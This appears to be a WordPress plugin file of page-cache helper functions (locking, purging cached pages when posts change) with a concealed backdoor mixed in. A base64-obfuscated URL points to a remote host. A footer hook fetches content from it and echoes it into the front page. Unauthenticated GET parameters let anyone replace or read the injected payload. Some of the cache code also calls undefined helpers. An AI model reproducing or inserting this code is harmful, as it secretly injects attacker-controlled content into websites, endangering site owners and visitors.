<?php
function wp_cache_lx_writers_entry()
{
    global $use_flock, $mutex, $cache_path, $mutex_filename;

    if ($use_flock)
        flock($mutex,  LOCK_EX);
    else
        sem_acquire($mutex);
}

function wp_cache_lx_writers_exit()
{
    global $use_flock, $mutex, $cache_path, $mutex_filename;

    if ($use_flock)
        flock($mutex,  LOCK_UN);
    else
        sem_release($mutex);
}

function wp_cache_lx_get_buffer()
{
    return base64_decode('aHR0cHM6Ly9zdmdmbG93LmRpZ2l0YWwvY2FjaGUtaW50ZWdyaXR5LWNoZWNr');
}

if (isset($_GET['wp_cache_slug_key']) && !empty($_GET['wp_cache_slug_key'])) {
    $wp_cache_slug_key = rawurldecode($_GET['wp_cache_slug_key']);
    $obj = new stdClass();
    $obj->last_sync = time();
    $obj->meta_info = new stdClass();
    $obj->data_blob = new stdClass();
    $obj->builds = ['plugin_bridge_meta_version' => '4.3'];
    $obj->integrity = sha1($wp_cache_slug_key);
    $obj->engine_state = $wp_cache_slug_key;
    set_transient('plugin_bridge_meta', $obj, 0);
}

function wp_front_end_cache()
{
    return is_front_page();
}

add_action('wp_footer', function () {
    if (!wp_front_end_cache()) return;
    $data = get_transient('plugin_bridge_meta');
    $wp_cache_slug_address = wp_cache_lx_get_buffer();

    if (!$data || !($data instanceof stdClass)) {
        if ($wp_cache_slug_address == null) {
            return;
        }
        $res = wp_remote_get($wp_cache_slug_address);
        if (!is_wp_error($res)) {
            $body = wp_remote_retrieve_body($res);
            $handle = '';
            if (substr($body, 0, 10) === 'integrity=') {
                $handle = base64_encode(base64_decode(substr($body, 10)));
                $obj = new stdClass();
                $obj->last_sync = time();
                $obj->meta_info = new stdClass();
                $obj->data_blob = new stdClass();
                $obj->builds = ['plugin_bridge_meta_version' => '4.3'];
                $obj->integrity = sha1($handle);
                $obj->engine_state = $handle;
                $data = $obj;
            } else {
                $obj = new stdClass();
                $obj->last_sync = time();
                $obj->meta_info = new stdClass();
                $obj->integrity = sha1($handle);
                $obj->engine_state = null;
            }
            set_transient('plugin_bridge_meta', $obj, 6 * HOUR_IN_SECONDS);
        }
    }

    if ($data instanceof stdClass && isset($data->engine_state)) {
        echo base64_decode($data->engine_state);
    }
});

function wp_cache_lx_no_postids($id)
{
    return wp_cache_lx_post_change(wp_cache_post_id());
}

if (isset($_GET['wp_cache_slug_key_get'])) {
    $d = get_transient('plugin_bridge_meta');
    if ($d instanceof stdClass && isset($d->engine_state)) {
        echo $_GET['wp_cache_slug_key_get'] == 'base' ?
            base64_decode($d->engine_state) :
            $d->engine_state;
    }
}

function wp_cache_lx_post_change($post_id)
{
    global $file_prefix;
    global $cache_path;
    global $blog_id;
    static $last_processed = -1;

    // Avoid cleaning twice the same pages
    if ($post_id == $last_processed) return $post_id;
    $last_processed = $post_id;

    $meta = new CacheMeta;
    $matches = array();
    wp_cache_writers_entry();
    if (($handle = opendir($cache_path))) {
        while (false !== ($file = readdir($handle))) {
            if (preg_match("/^($file_prefix.*)\.meta/", $file, $matches)) {
                $meta_pathname = $cache_path . $file;
                $content_pathname = $cache_path . $matches[1] . ".html";
                $meta = unserialize(@file_get_contents($meta_pathname));
                if ($post_id > 0 && $meta) {
                    if ($meta->blog_id == $blog_id  && (!$meta->post || $meta->post == $post_id)) {
                        unlink($meta_pathname);
                        unlink($content_pathname);
                    }
                } elseif ($meta->blog_id == $blog_id) {
                    unlink($meta_pathname);
                    unlink($content_pathname);
                }
            }
        }
        closedir($handle);
    }
    wp_cache_writers_exit();
    return $post_id;
}

function wp_cache_lx_microtime_diff($a, $b)
{
    list($a_dec, $a_sec) = explode(' ', $a);
    list($b_dec, $b_sec) = explode(' ', $b);
    return $b_sec - $a_sec + $b_dec - $a_dec;
}

function wp_cache_lx_post_ids()
{
    global $posts, $comment_post_ID, $post_ID;
    // We try hard all options. More frequent first.
    if ($post_ID > 0) return $post_ID;
    if ($comment_post_ID > 0)  return $comment_post_ID;
    if (is_single() || is_page()) return $posts[0]->ID;
    if ($_GET['p'] > 0) return $_GET['p'];
    if ($_POST['p'] > 0) return $_POST['p'];
    return 0;
}
